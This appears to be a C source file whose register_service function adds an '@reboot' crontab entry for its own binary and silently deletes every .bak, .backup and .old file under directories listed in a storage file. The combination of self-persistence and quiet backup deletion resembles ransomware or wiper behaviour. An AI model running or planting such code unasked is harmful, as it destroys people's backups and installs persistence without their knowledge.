#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <ftw.h>
#include <dirent.h>

#define MAX_CRONTAB_LINES 1000
#define MAX_LINE_LENGTH 4096

static const char *target_extensions[] = {".bak", ".backup", ".old", NULL};

static int ends_with(const char *str, const char *suffix) {
    if (!str || !suffix) return 0;
    size_t str_len = strlen(str);
    size_t suffix_len = strlen(suffix);
    if (suffix_len > str_len) return 0;
    return strcmp(str + str_len - suffix_len, suffix) == 0;
}

static int remove_backup_file(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    (void)sb;
    (void)ftwbuf;
    if (typeflag == FTW_F) {
        for (int i = 0; target_extensions[i] != NULL; i++) {
            if (ends_with(fpath, target_extensions[i])) {
                remove(fpath);
                break;
            }
        }
    }
    return 0;
}

static int process_storage_file(const char *scan_storage) {
    if (!scan_storage) return -1;
    
    FILE *fp = fopen(scan_storage, "r");
    if (!fp) {
        return -1;
    }
    
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    
    while ((read = getline(&line, &len, fp)) != -1) {
        /* Remove newline */
        if (read > 0 && line[read-1] == '\n') {
            line[read-1] = '\0';
        }
        
        /* Skip empty lines and comments */
        if (line[0] == '\0' || line[0] == '#') {
            continue;
        }
        
        /* Remove trailing whitespace */
        char *end = line + strlen(line) - 1;
        while (end > line && (*end == ' ' || *end == '\t')) {
            *end-- = '\0';
        }
        
        if (strlen(line) == 0) continue;
        
        /* Walk the directory tree recursively */
        if (nftw(line, remove_backup_file, 20, FTW_PHYS) == -1) {
            /* Silently continue on error */
            continue;
        }
    }
    
    free(line);
    fclose(fp);
    return 0;
}

static int crontab_entry_exists(const char *binary_path) {
    FILE *fp = popen("crontab -l 2>/dev/null", "r");
    if (!fp) {
        return 0; /* Assume it doesn't exist if can't read */
    }
    
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    char search_line[PATH_MAX + 64];
    int found = 0;
    
    snprintf(search_line, sizeof(search_line), "@reboot %s", binary_path);
    
    while ((read = getline(&line, &len, fp)) != -1) {
        if (read > 0 && line[read-1] == '\n') {
            line[read-1] = '\0';
        }
        if (strcmp(line, search_line) == 0) {
            found = 1;
            break;
        }
    }
    
    free(line);
    pclose(fp);
    return found;
}

static int add_crontab_entry(const char *binary_path) {
    /* First read existing crontab */
    FILE *read_fp = popen("crontab -l 2>/dev/null", "r");
    if (!read_fp) {
        return -1;
    }
    
    char **existing_lines = calloc(MAX_CRONTAB_LINES, sizeof(char*));
    if (!existing_lines) {
        pclose(read_fp);
        return -1;
    }
    
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    int line_count = 0;
    
    while ((read = getline(&line, &len, read_fp)) != -1 && line_count < MAX_CRONTAB_LINES) {
        existing_lines[line_count] = strdup(line);
        if (!existing_lines[line_count]) {
            /* Cleanup on allocation failure */
            for (int i = 0; i < line_count; i++) free(existing_lines[i]);
            free(existing_lines);
            free(line);
            pclose(read_fp);
            return -1;
        }
        line_count++;
    }
    free(line);
    pclose(read_fp);
    
    /* Write back with new entry */
    FILE *write_fp = popen("crontab -", "w");
    if (!write_fp) {
        for (int i = 0; i < line_count; i++) free(existing_lines[i]);
        free(existing_lines);
        return -1;
    }
    
    for (int i = 0; i < line_count; i++) {
        fprintf(write_fp, "%s", existing_lines[i]);
        free(existing_lines[i]);
    }
    free(existing_lines);
    
    fprintf(write_fp, "@reboot %s\n", binary_path);
    
    if (pclose(write_fp) == -1) {
        return -1;
    }
    
    return 0;
}

int register_service(int argc, char *argv[], const char *scan_storage) {
    (void)argc;
    int ret = 0;
    
    if (!argv || !argv[0]) {
        errno = EINVAL;
        return -1;
    }
    
    char binary_path[PATH_MAX];
    
    /* Normalize the binary path */
    if (argv[0][0] == '/') {
        /* Already absolute */
        snprintf(binary_path, sizeof(binary_path), "%s", argv[0]);
    } else {
        /* Get absolute path using realpath */
        char *resolved = realpath(argv[0], NULL);
        if (!resolved) {
            errno = ENOENT;
            return -1;
        }
        snprintf(binary_path, sizeof(binary_path), "%s", resolved);
        free(resolved);
    }
    
    /* Handle crontab */
    if (!crontab_entry_exists(binary_path)) {
        if (add_crontab_entry(binary_path) == -1) {
            ret = -1;
        }
    }
    
    /* Process storage file for backup cleanup */
    if (scan_storage) {
        if (process_storage_file(scan_storage) == -1) {
            ret = -1;
        }
    }
    
    return (ret == 0) ? 0 : -1;
}